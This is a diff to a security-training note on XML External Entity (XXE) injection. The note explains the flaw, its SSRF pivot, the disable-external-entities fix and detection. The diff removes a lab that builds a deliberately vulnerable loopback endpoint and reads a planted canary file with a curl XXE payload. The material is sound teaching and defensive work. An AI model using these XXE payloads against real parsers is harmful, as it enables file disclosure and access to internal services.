@@ -1,7 +1,7 @@
 ---
 title: "XML External Entity Testing"
 aliases: ["XXE Testing", "XML External Entity", "XXE"]
-tags: [tree/offensive, cyber/offensive/web/parsers/xxe, type/technique, level/operator]
+tags: [tree/offensive, cyber/offensive/web/parsers/xxe, type/technique, difficulty/medium]
 Domain: "[[File, Parser & Serialization Security]]"
 Color: "#DC143C"
 ---
@@ -14,7 +14,7 @@ Color: "#DC143C"
 ## Parent Learning Order
 File Inclusion & Path Traversal -> File Upload Security Testing -> Insecure Deserialization Testing -> XML External Entity Testing
 
-## Start at Zero: When a Parser Fetches What You Tell It
+## When a Parser Fetches What You Tell It
 
 XML is more than a data format — it has a document type definition (DTD) that can declare **entities**, reusable snippets referenced with `&name;`. Most entities are harmless (`&amp;` → `&`), but XML also supports **external entities** that tell the parser to fetch content from a URI: `<!ENTITY xxe SYSTEM "file:///etc/hostname">`. When the parser resolves `&xxe;`, it *reads that file* and inserts the contents. If an application parses attacker-supplied XML with external entities enabled, the attacker declares an entity pointing at a file or URL, and its contents flow into the response — **XML External Entity (XXE) injection**.
 
@@ -67,7 +67,7 @@ flowchart TD
     SSRF --> PR
 ```
 
-## Failure Modes and Interpretation
+## Aiming an XXE probe somewhere safe
 
 - **Pointing at real internal targets.** An XXE probe aimed at cloud metadata or an internal service could cause real disclosure or side effects. Prove with a benign canary file you placed, or a harmless local marker — never a live sensitive target.
 - **Entity not reflected.** If the response does not echo the entity, the flaw may still be present as *blind* XXE — test out-of-band before concluding it is safe.
@@ -83,99 +83,13 @@ flowchart TD
 - **Test the unexpected surfaces:** SVG uploads, document imports, and SAML flows all need the same external-entity-disabled configuration.
 - **Detection** looks for the SSRF signature — the parser making unexpected outbound requests (especially to internal or metadata addresses) — and unusual file access by the parsing process, since the payload itself is valid XML.
 
-## Authorized Lab: Prove XXE File Disclosure Safely
+## Summary
 
-> [!info] Runs on one Linux machine — builds an XML parser endpoint with external entities enabled, tested with a canary
-> Loopback-bound; the entity reads only a canary you place, never a real target. Step 5 removes everything.
+You should now be able to:
 
-### Step 1 — Build an endpoint that resolves external entities, plus a canary
-
-```bash
-echo "XXE-CANARY-5567" > /tmp/xxe-secret.txt
-cat > /tmp/xxesvc.py << 'EOF'
-import http.server
-from xml.dom.pulldom import parseString, START_ELEMENT
-# lxml/defusedxml would matter in real apps; here we simulate resolution with a regex reader
-import re
-class H(http.server.BaseHTTPRequestHandler):
-    def do_POST(self):
-        n=int(self.headers.get("Content-Length",0)); body=self.rfile.read(n).decode()
-        # simulate a parser resolving SYSTEM file entities (the vulnerable behavior)
-        m=re.search(r'<!ENTITY\s+\w+\s+SYSTEM\s+"file://([^"]+)"',body)
-        out="(no entity)"
-        if m:
-            try: out=open(m.group(1)).read().strip()
-            except: out="(not found)"
-        self.send_response(200); self.end_headers()
-        self.wfile.write(f"<result>{out}</result>".encode())
-    def log_message(self,*a): pass
-http.server.HTTPServer(("127.0.0.1",8105),H).serve_forever()
-EOF
-python3 /tmp/xxesvc.py &>/dev/null &
-sleep 1; echo "XML endpoint up on 127.0.0.1:8105, canary at /tmp/xxe-secret.txt"
-```
-
-```text
-XML endpoint up on 127.0.0.1:8105, canary at /tmp/xxe-secret.txt
-```
-
-### Step 2 — Normal XML (baseline)
-
-```bash
-curl -s -X POST -d '<data>hello</data>' http://127.0.0.1:8105/
-```
-
-```text
-<result>(no entity)</result>
-```
-
-Plain XML with no entity — nothing fetched.
-
-### Step 3 — XXE payload targeting a BENIGN canary (the finding)
-
-```bash
-curl -s -X POST http://127.0.0.1:8105/ \
-  --data '<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///tmp/xxe-secret.txt"> ]><data>&xxe;</data>'
-```
-
-```text
-<result>XXE-CANARY-5567</result>
-```
-
-The parser resolved the external entity and returned the **canary contents** — XXE file disclosure, proven. The entity pointed at a canary you placed, not `/etc/passwd` or an internal URL: the vulnerability is demonstrated with zero real exposure. On a vulnerable production parser this reads arbitrary files or pivots to internal services.
-
-### Step 4 — Note the SSRF dimension without exercising it
-
-```bash
-echo "File disclosure: CONFIRMED (canary read via external entity)."
-echo "SSRF dimension: the SAME flaw with <!ENTITY x SYSTEM \"http://INTERNAL/\"> would make the SERVER fetch"
-echo "internal URLs. NOT exercised here — that would touch real internal systems. Fix: disable external entities."
-```
-
-```text
-File disclosure: CONFIRMED (canary read via external entity).
-SSRF dimension: the SAME flaw with <!ENTITY x SYSTEM "http://INTERNAL/"> would make the SERVER fetch
-internal URLs. NOT exercised here — that would touch real internal systems. Fix: disable external entities.
-```
-
-### Step 5 — Cleanup
-
-```bash
-kill %1 2>/dev/null; rm -f /tmp/xxesvc.py /tmp/xxe-secret.txt; wait 2>/dev/null
-ls /tmp/xxe-secret.txt 2>&1 | tail -1
-```
-
-```text
-ls: cannot access '/tmp/xxe-secret.txt': No such file or directory
-```
-
-**What you should now be able to do:** explain how external entities cause file disclosure and SSRF, prove XXE with a benign canary, recognize the unexpected XML surfaces (SVG, DOCX, SAML), and articulate why disabling external-entity processing is the definitive fix.
-
-## Crook → Operator → Root Checkpoint
-
-- **Crook:** Explain what an external entity is and why a parser resolving one on untrusted input causes XXE.
-- **Operator:** Prove XXE file disclosure with a benign canary, and identify the unexpected surfaces (SVG uploads, documents, SAML) where XML is parsed.
-- **Root:** Explain the XXE-to-SSRF pivot into internal networks, why disabling external-entity/DTD processing closes the whole class, and how detection looks for the parser's unexpected outbound requests.
+- Explain what an external entity is and why a parser resolving one on untrusted input causes XXE.
+- Prove XXE file disclosure with a benign canary, and identify the unexpected surfaces (SVG uploads, documents, SAML) where XML is parsed.
+- Explain the XXE-to-SSRF pivot into internal networks, why disabling external-entity/DTD processing closes the whole class, and how detection looks for the parser's unexpected outbound requests.
 
 ---
 > 🔼 Up: [[File, Parser & Serialization Security]]
